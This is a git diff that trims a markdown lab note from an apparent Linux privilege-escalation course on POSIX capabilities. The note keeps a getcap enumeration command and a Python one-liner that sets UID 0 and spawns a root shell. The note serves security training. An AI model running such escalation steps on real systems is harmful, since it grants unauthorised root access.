@@ -1,18 +1,10 @@
-# 📁 Capabilities
+# Capabilities
 
-> **Curriculum:** TCM Security — Linux Privilege Escalation  
-> **Module Description:** Enumerating POSIX capabilities (getcap -r /), exploiting cap_setuid, cap_dac_override, and Python/Perl capability escalation.
-
----
-
-## 🎯 Learning Objectives & Methodology
-Mastering **Capabilities** involves understanding both the attacker's path to root elevation and the system administrator's hardening requirements.
+POSIX capabilities (getcap), cap_setuid, Python/Perl capability abuse.
 
 ---
 
 
-
-## 📝 Core Documentation & Lab Notes
 
 Resources for this video:
 Linux Privilege Escalation using Capabilities - [https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
@@ -27,19 +19,13 @@ To hunt capabilities
 getcap -r / 2>/dev/null
 ```
 
-
-![Privilege Escalation Proof Screenshot](./assets/022_Capabilities_1d6d64c5-e0cb-802a-a6e3-e37ca709f2b6.png)
-*Figure: Privilege Escalation Proof Screenshot*
-
+![Screenshot](./assets/022_Capabilities_1d6d64c5-e0cb-802a-a6e3-e37ca709f2b6.png)
 
 ep for permit everything basically(actual meaning check on google)
 
 To exploit this we just need to run python code which makes us root
 
-
-![Privilege Escalation Proof Screenshot](./assets/023_Capabilities_1d6d64c5-e0cb-8032-8968-c944041a020d.png)
-*Figure: Privilege Escalation Proof Screenshot*
-
+![Screenshot](./assets/023_Capabilities_1d6d64c5-e0cb-8032-8968-c944041a020d.png)
 
 ```bash
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
@@ -51,4 +37,4 @@ tar,openssl,perl
 
 
 ---
-[⬅ Back to Linux Privilege Escalation Master Index](../README.md)
+[Back to Linux Privilege Escalation Index](../README.md)
